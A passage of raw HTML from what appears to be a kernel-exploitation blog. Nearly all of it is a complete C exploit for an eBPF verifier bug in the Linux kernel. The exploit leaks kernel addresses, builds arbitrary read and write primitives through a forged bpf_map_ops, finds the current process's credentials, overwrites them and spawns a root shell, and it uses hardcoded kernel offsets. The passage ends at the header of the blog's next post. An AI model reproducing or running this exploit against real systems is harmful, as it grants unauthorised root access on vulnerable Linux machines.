class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;bpf_tools.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAP_SIZE 0x2000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARRAY_MAP_OPS 0xffffffff822363e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARRAY_MAP_GET_NEXT_KEY 0xffffffff81239c80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_TASK 0xffffffff82e1b400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff82e88f20</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VULN_REG    BPF_REG_6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, __dst_reg)                   \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* get a pointer to bpf_array */</span>                \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span></span><br><span class="line"><span class="meta">        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, __idx),        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* mov the result back and clear R0 */</span>          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(__dst_reg, BPF_REG_0),            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRIGGER_VULN(__map_fd)                          \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* load value into r2, make it part-unknown */</span>  \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8), \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, VULN_REG, BPF_REG_8, 0),    \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_4),    \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),          \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* r3 = 0x100000002 */</span>                          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* triger the vulnerability */</span>                  \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, VULN_REG, BPF_REG_3)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAKE_VULN_REG(__map_fd)                           \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* load value into r3, make it [0, 1] under 32 bit */</span> \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_8),   \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),     \</span></span><br><span class="line"><span class="meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_7, 1, 2),          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                      \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                  \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_ADD, VULN_REG, BPF_REG_7),      \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, VULN_REG, 0x1),            \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_AND, VULN_REG, 0x1),            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEAK_MAP_OPS(__map_fd)                             \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* extend the alu-&gt;limit and do the oob read */</span>    \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7),    \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),         \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),         \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),      \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x110),           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),       \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),      \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7),    \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEAK_MAP_ADDR(__map_fd)                         \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span></span><br><span class="line"><span class="meta">        BPF_MOV32_REG(VULN_REG, VULN_REG),              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, VULN_REG),    \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_8), \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READ_ARBITRARY_ADDR(__map_fd, __idx)            \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* extend the alu-&gt;limit and do the oob read */</span>     \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7),     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xd0),             \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* write the value into bpf_map-&gt;btf */</span>             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, BPF_REG_8), \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0),       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x58),            \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAKE_ARBITRARY_WRITE_OPS(__map_fd)                  \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* extend the alu_limit */</span>                          \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7),     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),                 \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite spin_lock_off */</span>                       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xE4),             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_5, 0x2000),                   \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),        \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite max_entries */</span>                         \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x8),              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_5, 0xffffffff),               \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),        \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite map_type */</span>                            \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xC),              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_5, 23),                       \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),        \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* overwrite the map-&gt;ops */</span>                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x18),             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),        \</span></span><br><span class="line"><span class="meta">        BPF_READ_ARRAY_MAP_IDX(2, __map_fd, BPF_REG_4),     \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_4, 0),       \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, 0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> fake_ops_addr;</span><br><span class="line"><span class="keyword">size_t</span> map_addr;</span><br><span class="line"><span class="keyword">size_t</span> map_ops_addr;</span><br><span class="line"><span class="keyword">size_t</span> current_task;</span><br><span class="line"><span class="keyword">size_t</span> current_cred;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">read_arbitrary_addr_4_bytes</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> data;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">        TRIGGER_VULN(map_fd),</span><br><span class="line">        MAKE_VULN_REG(map_fd),</span><br><span class="line">        READ_ARBITRARY_ADDR(map_fd, idx),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    ret = run_bpf_prog(prog, <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(prog[<span class="number">0</span>]), <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> <span class="title">info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .info.bpf_fd = map_fd,</span><br><span class="line">        .info.info_len = <span class="keyword">sizeof</span>(info),</span><br><span class="line">        .info.info = (<span class="keyword">uint64_t</span>)&amp;info,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;info, <span class="number">0</span>, <span class="keyword">sizeof</span>(info));</span><br><span class="line">    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    data = info.btf_id;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">read_arbitrary_addr</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">size_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> data;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> value[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    key = <span class="number">1</span>;</span><br><span class="line">    value[<span class="number">0</span>] = addr;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to load value into map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    key = <span class="number">2</span>;</span><br><span class="line">    value[<span class="number">0</span>] = addr + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to load value into map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    data = read_arbitrary_addr_4_bytes(map_fd, <span class="number">2</span>);</span><br><span class="line">    data &lt;&lt;= <span class="number">32</span>;</span><br><span class="line">    data += read_arbitrary_addr_4_bytes(map_fd, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">make_arbitrary_write_ops</span><span class="params">(<span class="keyword">int</span> map_fd)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">        TRIGGER_VULN(map_fd),</span><br><span class="line">        MAKE_VULN_REG(map_fd),</span><br><span class="line">        MAKE_ARBITRARY_WRITE_OPS(map_fd),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> per_ops_ptr, value[<span class="number">0x1000</span>], value_idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops_data</span>;</span></span><br><span class="line"></span><br><span class="line">    fake_ops_addr = map_addr + <span class="number">0x110</span> + MAP_SIZE; <span class="comment">/* save fake ops addr into map */</span></span><br><span class="line"></span><br><span class="line">    value_idx = <span class="number">0</span>; <span class="comment">/* read ops */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(struct bpf_map_ops); i += <span class="number">8</span>)&#123;</span><br><span class="line">        per_ops_ptr = read_arbitrary_addr(map_fd, map_ops_addr + i);</span><br><span class="line">        value[value_idx++] = per_ops_ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ops_data = (struct bpf_map_ops *)value; <span class="comment">/* load ops */</span></span><br><span class="line">    ops_data-&gt;map_push_elem = (<span class="keyword">void</span> *)(ARRAY_MAP_GET_NEXT_KEY + kernel_offset);</span><br><span class="line">    key = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="number">0</span>], <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to look up value!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    key = <span class="number">2</span>;</span><br><span class="line">    value[<span class="number">0</span>] = fake_ops_addr;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="number">0</span>], <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to look up value!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_bpf_prog(prog, <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(prog[<span class="number">0</span>]), <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">void</span> *p, <span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(size % <span class="keyword">sizeof</span>(<span class="keyword">void</span> *))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i += <span class="keyword">sizeof</span>(<span class="keyword">void</span> *))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%04x :  %02X %02X %02X %02X %02X %02X %02X %02X     0x%lx\n&quot;</span>, </span><br><span class="line">                i, buf[i+<span class="number">0</span>], buf[i+<span class="number">1</span>], buf[i+<span class="number">2</span>], buf[i+<span class="number">3</span>], buf[i+<span class="number">4</span>], buf[i+<span class="number">5</span>], buf[i+<span class="number">6</span>], buf[i+<span class="number">7</span>], *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> map_fd;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> value[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">int</span> log_fd;</span><br><span class="line"></span><br><span class="line">    map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="number">4</span>, MAP_SIZE, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">if</span> (map_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to create eBPF map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    key = <span class="number">0</span>;</span><br><span class="line">    value[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to load value into map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;leak map_ops_addr&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">        TRIGGER_VULN(map_fd),</span><br><span class="line">        MAKE_VULN_REG(map_fd),</span><br><span class="line">        LEAK_MAP_OPS(map_fd),</span><br><span class="line">        BPF_EXIT_INSN()</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span>(run_bpf_prog(prog, <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(prog[<span class="number">0</span>]), <span class="number">1</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to run bpf prog!&quot;</span>);  </span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    key = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to look up value!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    print_hex(value,<span class="number">0x10</span>);</span><br><span class="line">    map_ops_addr = value[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_ops_addr: 0x%lx\n&quot;</span>, map_ops_addr);</span><br><span class="line"></span><br><span class="line">    kernel_offset = map_ops_addr - ARRAY_MAP_OPS;</span><br><span class="line">    kernel_base += kernel_offset;</span><br><span class="line">    init_cred = INIT_CRED + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_ops_addr: 0x%lx\n&quot;</span>, map_ops_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base: 0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_offset: 0x%lx\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;leak map_addr&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog2</span>[] =</span> &#123;</span><br><span class="line">        TRIGGER_VULN(map_fd),</span><br><span class="line">        LEAK_MAP_ADDR(map_fd),</span><br><span class="line">        BPF_EXIT_INSN()</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span>(run_bpf_prog(prog2, <span class="keyword">sizeof</span>(prog2) / <span class="keyword">sizeof</span>(prog2[<span class="number">0</span>]), <span class="number">1</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to run bpf prog!&quot;</span>);  </span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    key = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_lookup_elem(map_fd, &amp;key, &amp;value) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to look up value!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    print_hex(value,<span class="number">0x10</span>);</span><br><span class="line">    map_addr = value[<span class="number">0</span>] - <span class="number">0x110</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_addr: 0x%lx\n&quot;</span>, map_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> next_task = INIT_TASK + kernel_offset + <span class="number">0x818</span>;</span><br><span class="line">    <span class="keyword">size_t</span> data;</span><br><span class="line"></span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;11111111&quot;</span>);</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        next_task = read_arbitrary_addr(map_fd, next_task);</span><br><span class="line">        data = read_arbitrary_addr(map_fd, next_task + <span class="number">0x2d0</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (data != *(<span class="keyword">size_t</span> *)<span class="string">&quot;11111111&quot;</span>);</span><br><span class="line"></span><br><span class="line">    current_task = next_task - <span class="number">0x818</span>;</span><br><span class="line">    current_cred = read_arbitrary_addr(map_fd, current_task + <span class="number">0xad8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;current_task: 0x%lx\n&quot;</span>, current_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;current_cred: 0x%lx\n&quot;</span>, current_cred);</span><br><span class="line"></span><br><span class="line">    make_arbitrary_write_ops(map_fd);</span><br><span class="line"></span><br><span class="line">    key = <span class="number">0</span>;</span><br><span class="line">    value[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="number">0</span>], current_cred + <span class="number">4</span> + <span class="number">4</span> * i) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to ovwerwrite no.%d\033[0m\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to call ops-&gt;map_push_elem()!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    get_root_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/21/Principles%EF%BC%9A%E6%B2%99%E7%9B%92%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
